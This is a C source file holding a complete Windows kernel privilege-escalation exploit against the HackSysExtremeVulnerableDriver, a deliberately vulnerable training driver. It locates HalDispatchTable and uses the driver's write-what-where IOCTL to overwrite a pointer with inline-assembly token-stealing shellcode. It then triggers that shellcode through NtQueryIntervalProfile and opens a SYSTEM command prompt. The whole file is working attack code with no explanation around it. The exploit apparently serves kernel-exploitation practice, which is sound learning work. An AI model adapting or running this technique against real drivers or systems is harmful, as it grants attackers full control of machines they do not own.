#include<stdio.h>
#include<Windows.h>
#include<Psapi.h>

typedef struct _WRITE_WHAT_WHERE
{
	PULONG_PTR What;
	PULONG_PTR Where;
} WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE;

typedef NTSTATUS(WINAPI* NtQueryIntervalProfile_t)(
	IN ULONG ProfileSource,
	OUT PULONG Interval
	);

LPVOID GetntkrnlpaKernelBase(){
	//Retrieves the load address for each device driver in the system
	LPVOID lpImageBase[1024];
	DWORD lpcbNeeded;
	TCHAR lpfileName[1024];
	EnumDeviceDrivers(lpImageBase, sizeof(lpImageBase), &lpcbNeeded);

	for (int i = 0; i < 1024; i++)
	{
		//Retrieves the base name of the specified device driver
		GetDeviceDriverBaseNameA(lpImageBase[i], (LPSTR)lpfileName, 48);

		if (!strcmp((char *)lpfileName, "ntkrnlpa.exe"))
		{
			printf("[+] Success to get %s\n", (char *)lpfileName);
			return lpImageBase[i];
		}
	}
	return NULL;
}

PVOID GetHalDispatchTable() {
	// 找到 ntkrnlpa.exe 在 kernel mode 中的基地址
	LPVOID ntkrnlpaKernelBase = GetntkrnlpaKernelBase();
	if (!ntkrnlpaKernelBase) {
		wprintf(L"[-] Failed to get ntkrnlpaKernelBase\n");
		exit(-1);
	}
	else {
		wprintf(L"[+] Success to get ntkrnlpaKernelBase: 0x%p\n",ntkrnlpaKernelBase);
	}
	// 找到 ntkrnlpa.exe 在 user mode 中的基地址
	HMODULE ntkrnlpaUserBase = NULL;
	ntkrnlpaUserBase = LoadLibraryA("ntkrnlpa.exe");
	if (!ntkrnlpaUserBase) {
		wprintf(L"[-] Failed to get ntkrnlpaUserBase\n");
		exit(-1);
	}
	else {
		wprintf(L"[+] Success to get ntkrnlpaUserBase: 0x%p\n", ntkrnlpaUserBase);
	}
	// 找到 HalDispatchTable 在 user mode 中的地址
	PVOID halDispatchTableUserAddress = NULL;
	halDispatchTableUserAddress = GetProcAddress(ntkrnlpaUserBase, "HalDispatchTable");
	if (!halDispatchTableUserAddress) {
		wprintf(L"[-] Failed to get halDispatchTableUserAddress\n");
		exit(-1);
	}
	else {
		wprintf(L"[+] Success to get halDispatchTableUserAddress: 0x%p\n", halDispatchTableUserAddress);
		PVOID halDispatchTable = (PVOID)((ULONG_PTR)ntkrnlpaKernelBase + ((ULONG_PTR)halDispatchTableUserAddress - (ULONG_PTR)ntkrnlpaUserBase));
		return halDispatchTable;
	}
	return NULL;
}

HANDLE OpenDriver() {
	HANDLE hevd = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
		NULL);

	if (hevd == INVALID_HANDLE_VALUE) {
		wprintf(L"[-] Failed to open hevd\n");
		exit(-1);
	}
	else {
		wprintf(L"[+] Success to open hevd\n");
	}
	return hevd;
}

VOID ShellCode()
{
	_asm
	{
		//int 3
		pop edi	// the stack balancing
		pop esi
		pop ebx
		pushad
		mov eax, fs: [124h]		// Find the _KTHREAD structure for the current thread
		mov eax, [eax + 0x50]   // Find the _EPROCESS structure
		mov ecx, eax
		mov edx, 4				// edx = system PID(4)

		// The loop is to get the _EPROCESS of the system
		find_sys_pid :
					 mov eax, [eax + 0xb8]	// Find the process activity list
					 sub eax, 0xb8    		// List traversal
					 cmp[eax + 0xb4], edx    // Determine whether it is SYSTEM based on PID
					 jnz find_sys_pid

					 // Replace the Token
					 mov edx, [eax + 0xf8]
					 mov[ecx + 0xf8], edx
					 popad
					 //int 3
					 ret
	}
}

  
VOID Trigger(DWORD32 where, DWORD32 what, HANDLE hevd)
{
	WRITE_WHAT_WHERE exploit;
	DWORD lpbReturn = 0;

	exploit.Where = (PULONG_PTR)where;
	exploit.What = (PULONG_PTR)& what;

	DeviceIoControl(hevd,
		0x22200B,
		&exploit,
		sizeof(WRITE_WHAT_WHERE),
		NULL,
		0,
		&lpbReturn,
		NULL);
}


int main() {
	HANDLE hevd = OpenDriver();

	PVOID HalDispatchTable = NULL;
	HalDispatchTable = GetHalDispatchTable();
	if (!HalDispatchTable) {
		wprintf(L"[-] Failed to get HalDispatchTable\n");
		exit(-1);
	}
	else {
		wprintf(L"[+] Success to get HalDispatchTable:0x%p\n",HalDispatchTable);
	}
	PVOID HalDispatchTablePlus4 = NULL;
	HalDispatchTablePlus4 = (PVOID)((ULONG_PTR)HalDispatchTable + sizeof(PVOID));
	wprintf(L"[+] Success to get HalDispatchTable+4:0x%p\n",HalDispatchTablePlus4);

	Trigger((DWORD32)HalDispatchTablePlus4,(DWORD32)& ShellCode,hevd);
	
	NtQueryIntervalProfile_t NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtQueryIntervalProfile");

	printf("[+]NtQueryIntervalProfile address is 0x%x\n", NtQueryIntervalProfile);
	ULONG interVal;
	NtQueryIntervalProfile(0x1337, &interVal);

	printf("[+]Start to Create cmd...\n");

	system("cmd.exe");
	return 0;
}

